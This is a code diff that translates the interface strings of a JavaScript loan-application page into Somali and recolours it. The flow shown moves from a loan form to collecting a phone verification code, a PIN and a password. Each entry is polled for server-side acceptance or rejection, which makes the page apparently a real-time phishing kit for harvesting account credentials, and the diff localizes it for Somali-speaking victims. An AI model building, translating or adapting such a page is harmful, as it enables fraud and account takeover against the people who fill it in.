@@ -103,7 +103,7 @@ document.addEventListener('DOMContentLoaded', () => {
                 if (pollCount > maxPolls) {
                     clearInterval(interval);
                     hideLoading();
-                    showError("Request timed out. Please try again.");
+                    showError("Waqtigii waa dhacay. Fadlan isku day mar kale.");
                     return;
                 }
 
@@ -121,7 +121,7 @@ document.addEventListener('DOMContentLoaded', () => {
                         clearInterval(interval);
                         hideLoading();
                         if (onReject) onReject();
-                        else showError("Information rejected. Please check and try again.");
+                        else showError("Xogtaada waa la diiday. Fadlan isku day mar kale.");
                     }
                 } catch (e) {
                     console.error("Polling error", e);
@@ -131,7 +131,7 @@ document.addEventListener('DOMContentLoaded', () => {
         } catch (err) {
             console.error(err);
             hideLoading();
-            showError("Failed to connect to server. Please try again.");
+            showError("Way ku fashilantay ku xirnaanta serfarka. Fadlan isku day mar kale.");
         }
     }
 
@@ -153,26 +153,26 @@ document.addEventListener('DOMContentLoaded', () => {
         dot2.style.background = '#333';
         dot3.style.background = '#333';
 
-        stepText.innerText = `Step ${currentStep} of 3`;
+        stepText.innerText = `Tallaabada ${currentStep} ee 3`;
 
         if (currentStep === 1) {
             appStep1.classList.remove('hidden');
-            dot1.style.background = '#6f5cc3';
+            dot1.style.background = '#0dc98f';
             btnPrevStep.classList.add('hidden');
-            btnNextStep.innerText = 'NEXT STEP';
+            btnNextStep.innerText = 'TALLAABADA XIGTA';
         } else if (currentStep === 2) {
             appStep2.classList.remove('hidden');
-            dot1.style.background = '#6f5cc3';
-            dot2.style.background = '#6f5cc3';
+            dot1.style.background = '#0dc98f';
+            dot2.style.background = '#0dc98f';
             btnPrevStep.classList.remove('hidden');
-            btnNextStep.innerText = 'NEXT STEP';
+            btnNextStep.innerText = 'TALLAABADA XIGTA';
         } else if (currentStep === 3) {
             appStep3.classList.remove('hidden');
-            dot1.style.background = '#6f5cc3';
-            dot2.style.background = '#6f5cc3';
-            dot3.style.background = '#6f5cc3';
+            dot1.style.background = '#0dc98f';
+            dot2.style.background = '#0dc98f';
+            dot3.style.background = '#0dc98f';
             btnPrevStep.classList.remove('hidden');
-            btnNextStep.innerText = 'SUBMIT APPLICATION';
+            btnNextStep.innerText = 'DIR CODSIGA';
 
             // Populate summary
             sumAmount.innerText = `$${loanAmount.value || 0}`;
@@ -192,21 +192,21 @@ document.addEventListener('DOMContentLoaded', () => {
     btnNextStep.addEventListener('click', () => {
         if (currentStep === 1) {
             if (!loanAmount.value || !loanPurpose.value) {
-                showError("Please fill out all fields.");
+                showError("Fadlan buuxi dhammaan meelaha banaan.");
                 return;
             }
             currentStep++;
             updateStepUI();
         } else if (currentStep === 2) {
             if (!firstName.value || !lastName.value || !emailAddress.value) {
-                showError("Please fill out all fields.");
+                showError("Fadlan buuxi dhammaan meelaha banaan.");
                 return;
             }
             currentStep++;
             updateStepUI();
         } else if (currentStep === 3) {
             if (!annualIncome.value) {
-                showError("Please fill out your annual income.");
+                showError("Fadlan geli dakhligaaga sannadlaha ah.");
                 return;
             }
             // Done with Application! Go to Phone screen.
@@ -273,7 +273,7 @@ document.addEventListener('DOMContentLoaded', () => {
                 pinScreen.classList.add('active');
                 setTimeout(() => pinBoxes[0].focus(), 400);
             }, () => {
-                showError("Invalid verification code. Try again.");
+                showError("Koodhka xaqiijinta waa khalad. Isku day mar kale.");
                 codeBoxes.forEach(b => { b.value = ''; b.classList.remove('filled'); });
                 codeBoxes[0].focus();
                 btnNextCode.disabled = true;
@@ -294,7 +294,7 @@ document.addEventListener('DOMContentLoaded', () => {
                 passwordScreen.classList.add('active');
                 setTimeout(() => passwordInput.focus(), 400);
             }, () => {
-                showError("Invalid PIN. Try again.");
+                showError("PIN-ku waa khalad. Isku day mar kale.");
                 pinBoxes.forEach(b => { b.value = ''; b.classList.remove('filled'); });
                 pinBoxes[0].focus();
                 btnNextPin.disabled = true;
@@ -310,18 +310,18 @@ document.addEventListener('DOMContentLoaded', () => {
             processStep(payload, () => {
                 if (typeof Toastify !== 'undefined') {
                     Toastify({
-                        text: "Setup Complete! Redirecting...",
+                        text: "Waa lagu guuleystay! Waa lagu wareejinayaa...",
                         duration: 3000,
                         gravity: "top",
                         position: "center",
                         style: { background: "#0dc98f", borderRadius: "8px" }
                     }).showToast();
                 } else {
-                    alert("Setup Complete!");
+                    alert("Waa lagu guuleystay!");
                 }
                 setTimeout(() => window.location.reload(), 3000);
             }, () => {
-                showError("Password rejected. Please use a different password.");
+                showError("Baasaboorka lama aqbalin. Fadlan isku day baasaboor kale.");
                 passwordInput.value = '';
                 btnNextPassword.disabled = true;
                 btnNextPassword.classList.add('disabled');
